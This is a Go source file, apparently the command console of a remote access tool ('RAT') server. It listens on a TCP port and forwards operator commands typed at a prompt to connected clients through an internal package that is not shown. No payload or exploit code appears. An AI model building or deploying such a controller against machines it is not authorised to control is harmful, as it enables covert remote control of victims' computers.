package main

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"io"
	"os"
	"strings"
	"time"

	"server/internal/rat"
	"server/internal/utility"
)

const (
	// DefaultPort is the default TCP listening port.
	DefaultPort int = 10080
)

func main() {
	help := flag.Bool("h", false, "This help")
	port := flag.Int("p", DefaultPort, "Listening port")
	flag.Parse()
	if *help {
		flag.PrintDefaults()
		return
	}

	logger := utility.NewLogQue(os.Stdout, time.Stamp)
	rat := rat.NewRAT(logger)
	err := rat.Startup(*port)
	if err != nil {
		logger.Fatal(err)
	}

	defer rat.Close()

	stdin := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("> ")
		input, err := stdin.ReadString('\n')
		if err != nil {
			if errors.Is(err, io.EOF) {
				return
			}

			logger.Log(err)
			continue
		}

		input = strings.TrimSpace(input)
		if input == "" {
			rat.Exec("", nil)
			continue
		}

		fields := strings.Fields(input)
		err = rat.Exec(fields[0], fields[1:])
		if err != nil {
			if errors.Is(err, io.EOF) {
				return
			}

			logger.Log(err)
		}
	}
}
